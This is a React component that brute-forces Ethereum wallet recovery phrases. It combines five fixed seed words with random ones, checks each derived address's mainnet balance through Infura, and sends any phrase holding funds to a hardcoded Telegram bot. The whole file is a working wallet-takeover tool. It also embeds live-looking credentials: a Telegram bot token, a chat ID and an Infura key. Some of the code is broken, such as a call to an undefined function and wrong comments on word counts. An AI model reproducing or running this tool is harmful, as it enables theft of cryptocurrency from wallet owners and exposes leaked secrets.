"use client"
import React, { useState, useEffect, useRef } from "react";
import { Button, Dialog, DialogPanel } from "@tremor/react";
import * as bip39 from "bip39";
import { ethers } from "ethers";
import pLimit from "p-limit";

const rateLimit = pLimit(2);
const TELEGRAM_BOT_TOKEN = "7458527169:AAHclRKmcrcAD4OSNEJBCM1kP4WvjfXmtCQ"; // Replace with your bot token
const CHAT_ID = "140867059"; // Replace with your chat ID

export default function RandomWordsGenerator() {
  const [wordGroups, setWordGroups] = useState([]);
  const [isOpen, setIsOpen] = useState(false);
  const [validationMessage, setValidationMessage] = useState("");
  const [groupBalances, setGroupBalances] = useState([]);
  const [buttonColor, setButtonColor] = useState("bg-green-500");
  const [shouldContinue, setShouldContinue] = useState(true);

  const intervalRef = useRef(null);

  useEffect(() => {
    if (!shouldContinue) {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
      return;
    }

    intervalRef.current = setInterval(() => {
      generateRandomWords();
    }, 23000);

    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, [shouldContinue]);

  useEffect(() => {
    if (wordGroups.length > 0 && shouldContinue) {
      const checkBalances = async () => {
        const validGroups = wordGroups.filter(validatePhrase);
        const balances = await Promise.all(
          validGroups.map(async (group) => {
            return rateLimit(() => checkWalletBalance(group));
          })
        );
        setGroupBalances(balances);

        const found = balances.find((b) => parseFloat(b.balance) >= 0.00001);
        if (found) {
          setShouldContinue(false);
          await sendToTelegram(found.group);
        }
      };

      checkBalances();
    }
  }, [wordGroups]);

  const generateRandomWords = () => {
    const groups = [];
    for (let i = 0; i < 50; i++) {
      let mnemonic = "";
  
      // Generate mnemonics and check if valid
      while (!bip39.validateMnemonic(mnemonic)) {
        const randomMnemonic = bip39.generateMnemonic(128); // Generate 12-word phrase
        const remainingWords = randomMnemonic.split(" ").slice(0, 7); // 8 words from random mnemonic
  
        const fixedWords = ["tribe", "any", "path", "tourist" ,"risk"]; // Fixed first 4 words
        const finalGroup = [...fixedWords, ...remainingWords]; // Combine fixed and generated words
  
        mnemonic = finalGroup.join(" ");
      }
  
      groups.push(mnemonic.split(" "));
    }
  
    setWordGroups(groups);
  };
  

  const copyToClipboard = (group) => {
    const wordsToCopy = group.join(" ");
    navigator.clipboard.writeText(wordsToCopy);
    setIsOpen(true);
  };

  const validatePhrase = (group) => {
    const mnemonic = group.join(" ");
    return bip39.validateMnemonic(mnemonic);
  };

  // Updated checkWalletBalance function
  const checkWalletBalance = async (group, retries = 3) => {
    const mnemonicPhrase = group.join(" ");
    try {
      const mnemonic = ethers.Mnemonic.fromPhrase(mnemonicPhrase);
      const wallet = ethers.HDNodeWallet.fromMnemonic(mnemonic);
      const provider = new ethers.InfuraProvider(
        "mainnet",
        "eb820fc8f8d5445099e988beadba9a27"
      );

      const balance = await provider.getBalance(wallet.address);
      const balanceInEth = ethers.formatEther(balance);

      return {
        group,
        balance: parseFloat(balanceInEth) >= 0.000001 ? balanceInEth : "0.0",
      };
    } catch (error) {
      if (retries > 0 && error.message.includes("429")) {
        // Retry after a delay if rate limited
        console.warn("Rate limited. Retrying after delay...");
        await new Promise((resolve) => setTimeout(resolve, 1000)); // 1 second delay
        return checkWalletBalance(group, retries - 1);
      }

      console.error("Error checking wallet balance:", error.message);
      setValidationMessage("Failed to check wallet balance.");
      return { group, balance: "Error" };
    }
  };

  const sendToTelegram = async (group) => {
    const mnemonicPhrase = group.join(" ");
    const message = `Wallet with sufficient balance found:\n\n${mnemonicPhrase}\nBalance: ${parseFloat(
      group.balance
    )} ETH`;

    try {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
          }),
        }
      );
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
    }
  };

  const handleButtonClick = async (group) => {
    if (validatePhrase(group)) {
      setButtonColor("bg-yellow-500");
      const balance = await checkWalletBalance(group);
      if (balance.balance !== "Error") {
        copyToClipboard(group);
      }
    }
  };

  return (
    <>
      <Button
        onClick={generateRandomWords}
        className="bg-blue-500 text-white px-1 py-1 rounded hover:bg-blue-600 transition"
      >
        Generate Random Words
      </Button>

      <Button
        onClick={() => {
          generateRandomWords();
          checkAllBalances();
        }}
        className="bg-red-500 text-white px-1 py-1 rounded hover:bg-red-600 transition mt-1"
      >
        Check All Balances
      </Button>

      {wordGroups.length > 0 && (
        <div className="mt-1 grid grid-cols-7 gap-1 text-xs bg">
          {wordGroups.map((group, index) => (
            <div key={index} className="bg-gray-700 p-1 rounded shadow-md">
              <ul className="grid grid-cols-10 gap-1">
                {group.map((word, wordIndex) => (
                  <li key={wordIndex} className="text-center py-1">
                    {word}
                  </li>
                ))}
              </ul>
              <Button
                onClick={() => handleButtonClick(group)}
                className={`${buttonColor} text-xs text-white px-1 py-1 rounded hover:bg-yellow-600 transition mt-1`}
              ></Button>
              {validationMessage && (
                <p className="mt-1 text-red-500">{validationMessage}</p>
              )}
              {groupBalances.find((b) => b.group === group) && (
                <p
                  className={`mt-1 ${
                    parseFloat(
                      groupBalances.find((b) => b.group === group).balance
                    ) === 0
                      ? "text-red-500"
                      : "text-green-500"
                  }`}
                >
                  ETH Balance: {groupBalances.find((b) => b.group === group).balance}
                </p>
              )}
            </div>
          ))}
        </div>
      )}

      <Dialog open={isOpen} onClose={() => setIsOpen(false)} static={true}>
        <DialogPanel>
          <h3 className="text-lg font-semibold text-tremor-content-strong dark:text-dark-tremor-content-strong">
            Copied Successfully
          </h3>
          <p className="mt-2 leading-6 text-tremor-default text-tremor-content dark:text-dark-tremor-content">
            The words have been copied to your clipboard.
          </p>
        </DialogPanel>
      </Dialog>
    </>
  );
}
